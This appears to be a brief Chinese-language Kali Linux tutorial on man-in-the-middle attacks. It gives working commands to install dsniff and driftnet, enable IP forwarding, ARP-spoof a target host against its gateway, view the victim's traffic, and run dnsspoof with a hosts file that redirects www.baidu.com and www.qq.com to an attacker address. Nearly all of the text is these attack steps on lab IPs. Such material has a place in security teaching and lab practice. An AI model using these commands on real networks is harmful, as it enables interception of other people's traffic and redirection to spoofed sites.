1、ARP欺骗

1.1 软件安装

默认kali2.0没有带arpspoof软件，需要手动安装

apt-get install dsniff ssldump

1.2 使用方法

arpspoof [-i interface]  [-t target] [-r] host-i   指定接口-t   被攻击者IP-r   网关IP地址


开启转发功能

echo 1 >/proc/sys/net/ipv4/ip_forward# 关闭转发功能echo 0 >/proc/sys/net/ipv4/ip_forward

1.3 开启ARP欺骗

arpspoof -i eth0 -t 192.168.207.136 192.168.207.2

1.4 查看访问数据

apt-get install driftnetdriftnet -i eth0

2、DNS欺骗

由于DNS协议使用是传输层协议是UDP协议, 这样无需像TCP那样建立连接就可以轻松的伪造应答包，包括源IP. 10.10.10.2发送DNS 查询包问DNS服务器www.baidu.com的IP地址是多少？10.10.10.1装作DNS服务器（伪造IP）向攻击目标发送一个DNS响应包说www.baidu.com的IP地址是10.10.10.3。

# 生成一个解析文件vim /tmp/dnsspoof.hosts192.168.207.132 www.baidu.com192.168.207.132 www.qq.com

2.1 先开启ARP欺骗

arpspoof -i eth0 -t 192.168.207.136 192.168.207.2

2.2 开启DNS欺骗

dnsspoof -i eth0 -f /tmp/dnsspoof.hosts  -i 指定监听接口  -f 指定修改的DNS解析文件
